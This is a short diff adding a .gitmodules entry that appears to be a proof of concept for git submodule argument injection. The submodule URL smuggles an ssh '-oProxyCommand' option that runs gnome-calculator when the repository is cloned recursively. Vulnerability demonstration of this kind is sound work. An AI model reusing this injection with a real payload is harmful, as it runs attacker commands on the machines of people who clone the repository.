@@ -1,0 +1,3 @@
+[submodule "git_calc_rce"]
+	path = git_calc_rce
+	url = ssh://-oProxyCommand=gnome-calculator/wat
